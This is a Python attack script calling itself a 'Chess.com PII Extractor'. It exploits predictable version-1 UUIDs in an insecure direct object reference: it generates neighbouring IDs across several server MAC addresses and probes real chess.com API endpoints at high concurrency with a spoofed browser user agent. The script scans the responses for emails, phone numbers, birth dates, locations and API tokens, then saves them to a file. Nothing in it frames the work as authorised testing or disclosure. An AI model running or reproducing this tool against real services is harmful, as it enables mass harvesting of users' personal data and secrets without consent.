import uuid
import requests
import sys
import json
import re
import time
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

GREGORIAN_OFFSET = 0x01b21dd213814000

EMAIL_RE = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
USERNAME_RE = r'(?:"username"\s*:\s*"([^"]+))'
DISPLAY_NAME_RE = r'(?:"(?:display_name|name|full_name|nickname)"\s*:\s*"([^"]+))'
PHONE_RE = r'(?:"phone(?:_number)?"\s*:\s*"([^"]+))'
LOCATION_RE = r'(?:"(?:location|country|city|timezone)"\s*:\s*"([^"]+))'
DOB_RE = r'(?:"(?:birth_date|date_of_birth|dob)"\s*:\s*"([^"]+))'
AVATAR_RE = r'(?:"(?:avatar|profile_picture|image_url)"\s*:\s*"([^"]+))'
TOKEN_RE = r'(?:"(?:token|api_key|secret|jwt)"\s*:\s*"([A-Za-z0-9_\-.]{20,}))'
PII_PATTERNS = {
    "email": EMAIL_RE,
    "username": USERNAME_RE,
    "display_name": DISPLAY_NAME_RE,
    "phone": PHONE_RE,
    "location": LOCATION_RE,
    "birth_date": DOB_RE,
    "avatar": AVATAR_RE,
    "token": TOKEN_RE,
}

BANNER = """
=== Chess.com PII Extractor v1.0 ===
Goal: Extract Personal Identifiable Information via UUID v1 IDOR
Strategy: Enumerate neighbor UUIDs, scan responses for PII patterns
=====================================
"""

def decode_uuid_v1(uuid_str):
    u = uuid.UUID(uuid_str)
    unix_ts = (u.time - GREGORIAN_OFFSET) / 1e7
    dt = datetime.fromtimestamp(unix_ts, tz=timezone.utc)
    return {
        "uuid": uuid_str,
        "version": u.version,
        "time_low": hex(u.time_low),
        "time_mid": hex(u.time_mid),
        "time_hi_version": hex(u.time_hi_version),
        "clock_seq": u.clock_seq,
        "node": hex(u.node),
        "timestamp_100ns": u.time,
        "datetime_utc": dt.isoformat(),
        "mac_formatted": ":".join(f"{(u.node >> (8*(5-i))) & 0xFF:02x}" for i in range(6))
    }

def generate_nearby(target_uuid_str, delta_range=100, step=1):
    target = uuid.UUID(target_uuid_str)
    results = []
    for delta in range(-delta_range, delta_range + 1):
        new_time = target.time + (delta * step)
        if new_time < 0:
            continue
        new_uuid = uuid.UUID(
            fields=(
                new_time & 0xFFFFFFFF,
                (new_time >> 32) & 0xFFFF,
                (new_time >> 48) & 0x0FFF | 0x1000,
                target.clock_seq_hi_variant,
                target.clock_seq_low,
                target.node
            ),
            version=1
        )
        results.append(str(new_uuid))
    return results

def generate_multi_node(target_uuid_str, other_nodes=None, delta_range=100):
    if other_nodes is None:
        other_nodes = ["07:10:e9:c9:32:95", "53:0c:f2:df:aa:9a", "9b:04:a8:f3:be:53"]
    target = uuid.UUID(target_uuid_str)
    results = {}

    for label, mac_hex in [("node_original", target.node)]:
        pass

    results["original_node"] = generate_nearby(target_uuid_str, delta_range)
    if other_nodes:
        for node_mac in other_nodes:
            try:
                node_int = int(node_mac.replace(":", ""), 16)
                new_uuids = []
                for delta in range(-delta_range, delta_range + 1):
                    new_time = target.time + (delta * 1)
                    if new_time < 0:
                        continue
                    new_uuid = uuid.UUID(
                        fields=(
                            new_time & 0xFFFFFFFF,
                            (new_time >> 32) & 0xFFFF,
                            (new_time >> 48) & 0x0FFF | 0x1000,
                            target.clock_seq_hi_variant,
                            target.clock_seq_low,
                            node_int
                        ), version=1
                    )
                    new_uuids.append(str(new_uuid))
                results[node_mac] = new_uuids
            except:
                continue
    return results

def scan_for_pii(text, source_label=""):
    findings = {}
    for pii_type, pattern in PII_PATTERNS.items():
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            findings[pii_type] = list(set(matches))
    return findings

def probe_endpoint(session, base_url, uid, cookies=None, headers=None, timeout=10):
    url = f"{base_url}/{uid}"
    try:
        resp = session.get(url, cookies=cookies, headers=headers, timeout=timeout)
        pii = scan_for_pii(resp.text, url)
        return {
            "uuid": uid,
            "url": url,
            "status": resp.status_code,
            "length": len(resp.text),
            "headers": dict(resp.headers),
            "pii_found": pii,
            "body": resp.text[:2000]
        }
    except Exception as e:
        return {"uuid": uid, "url": url, "status": 0, "error": str(e), "pii_found": {}}

def batch_pii_scan(base_urls, uuids, cookies=None, headers=None, threads=30):
    results = {
        "total_probes": 0,
        "pii_hits": [],
        "status_codes": {},
        "by_endpoint": {url: {"total": 0, "hits": 0, "pii": []} for url in base_urls},
        "all": []
    }

    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            fut_map = {}
            for uid in uuids:
                for base_url in base_urls:
                    fut = executor.submit(probe_endpoint, session, base_url, uid, cookies, headers)
                    fut_map[fut] = (base_url, uid)

            done = 0
            for fut in as_completed(fut_map):
                done += 1
                base_url, uid = fut_map[fut]
                r = fut.result()
                results["all"].append(r)
                results["total_probes"] += 1
                results["by_endpoint"][base_url]["total"] += 1

                sc = r["status"]
                results["status_codes"][sc] = results["status_codes"].get(sc, 0) + 1

                pii = r.get("pii_found", {})
                if pii:
                    results["pii_hits"].append(r)
                    results["by_endpoint"][base_url]["hits"] += 1
                    results["by_endpoint"][base_url]["pii"].append({
                        "uuid": uid,
                        "pii": pii,
                        "body_preview": r.get("body", "")[:500]
                    })
                    print(f"\n  [!] PII FOUND at {r['url']}")
                    for ptype, vals in pii.items():
                        for v in vals[:3]:
                            print(f"      {ptype}: {v}")

                sys.stdout.write(f"\r  Progress: {done}/{len(uuids) * len(base_urls)} (PII hits: {len(results['pii_hits'])})")
                sys.stdout.flush()

    print()
    return results

def print_pii_report(results):
    print("\n" + "=" * 70)
    print("PII EXTRACTION REPORT")
    print("=" * 70)

    print(f"\nTotal probes: {results['total_probes']}")
    print(f"PII hits:     {len(results['pii_hits'])}")
    print(f"Status codes: {results['status_codes']}")

    print(f"\n--- By Endpoint ---")
    for ep, data in results["by_endpoint"].items():
        pii_count = len(data["pii"])
        print(f"  {ep:45s} {data['total']:4d} probes, {data['hits']:3d} hits, {pii_count} PII items")

    if results["pii_hits"]:
        print(f"\n--- PII Details ---")
        for i, hit in enumerate(results["pii_hits"]):
            print(f"\n  #{i+1}: {hit.get('url', 'N/A')}")
            print(f"      Status: {hit['status']}, Size: {hit.get('length', 0)}")
            pii = hit.get("pii_found", {})
            for ptype, vals in pii.items():
                for v in vals[:5]:
                    print(f"      [{ptype}] {v}")

def save_pii_results(results, filename="pii_extraction_results.json"):
    clean = []
    for r in results.get("all", []):
        clean.append({
            "uuid": r.get("uuid"),
            "url": r.get("url"),
            "status": r.get("status"),
            "length": r.get("length"),
            "pii_found": r.get("pii_found", {}),
            "body": r.get("body", "")[:500],
            "headers": {k: v for k, v in r.get("headers", {}).items() if k.lower() not in ("set-cookie",)}
        })
    results["all"] = clean
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n[+] Results saved to {filename}")

def main():
    print(BANNER)

    if len(sys.argv) < 2:
        print("Usage:")
        print("  python pii_extractor.py <uuid> [options]")
        print()
        print("Required:")
        print("  <uuid>        Your badge UUID from /settings/profile")
        print()
        print("Options:")
        print("  --range N        Delta range per node (default: 50)")
        print("  --nodes NODES    Comma-separated extra server MACs (optional)")
        print("  --endpoints URL  Comma-separated API endpoints (default: see below)")
        print("  --cookie COOKIE  Session cookie (name=value)")
        print("  --threads N      Thread count (default: 30)")
        print("  --output FILE    Output JSON file")
        print()
        print("Default endpoints:")
        print("  /api/badge/{uuid}")
        print("  /api/user/{uuid}")
        print("  /api/profile/{uuid}")
        return

    target_uuid = sys.argv[1]
    delta_range = 50
    extra_nodes = None
    cookie_str = None
    threads = 30
    output_file = "pii_extraction_results.json"

    default_endpoints = [
        "https://chess.com/api/badge",
        "https://chess.com/api/user",
        "https://chess.com/api/profile",
    ]
    base_urls = list(default_endpoints)

    for i, arg in enumerate(sys.argv[2:], 2):
        if arg == "--range" and i + 1 < len(sys.argv):
            delta_range = int(sys.argv[i + 1])
        elif arg == "--nodes" and i + 1 < len(sys.argv):
            extra_nodes = [n.strip() for n in sys.argv[i + 1].split(",")]
        elif arg == "--endpoints" and i + 1 < len(sys.argv):
            base_urls = [u.strip() for u in sys.argv[i + 1].split(",")]
        elif arg == "--cookie" and i + 1 < len(sys.argv):
            cookie_str = sys.argv[i + 1]
        elif arg == "--threads" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
        elif arg == "--output" and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]

    cookies = None
    if cookie_str:
        parts = cookie_str.split("=", 1)
        cookies = {parts[0]: parts[1]} if len(parts) == 2 else None

    decoded = decode_uuid_v1(target_uuid)
    print(f"[*] Source UUID: {target_uuid}")
    print(f"    Version: {decoded['version']} {'v1 - PREDICTABLE' if decoded['version'] == 1 else 'NOT v1'}")
    print(f"    Server MAC: {decoded['mac_formatted']}")
    print(f"    Generated: {decoded['datetime_utc']}")
    print(f"    Clock seq: {decoded['clock_seq']}")

    if decoded["version"] != 1:
        print("\n[-] UUID is NOT v1. This exploit requires v1.")
        return

    known_nodes = None
    if extra_nodes:
        known_nodes = extra_nodes
    else:
        known_nodes = ["07:10:e9:c9:32:95", "53:0c:f2:df:aa:9a", "9b:04:a8:f3:be:53"]

    print(f"\n[*] Generating UUIDs across {len(known_nodes) + 1} server nodes...")
    multi_node = generate_multi_node(target_uuid, known_nodes, delta_range)

    all_uuids = []
    for node_label, node_uuids in multi_node.items():
        all_uuids.extend(node_uuids)

    all_uuids = list(set(all_uuids))
    print(f"[*] Total unique UUIDs to test: {len(all_uuids)}")

    print(f"\n[*] Probing {len(base_urls)} endpoints across {len(all_uuids)} UUIDs...")
    print(f"    Endpoints: {base_urls}")

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    results = batch_pii_scan(base_urls, all_uuids, cookies, headers, threads)

    results["config"] = {
        "source_uuid": target_uuid,
        "delta_range": delta_range,
        "extra_nodes": known_nodes,
        "endpoints": base_urls,
        "total_uuids": len(all_uuids),
        "timestamp": datetime.utcnow().isoformat()
    }

    print_pii_report(results)
    save_pii_results(results, output_file)

if __name__ == "__main__":
    main()
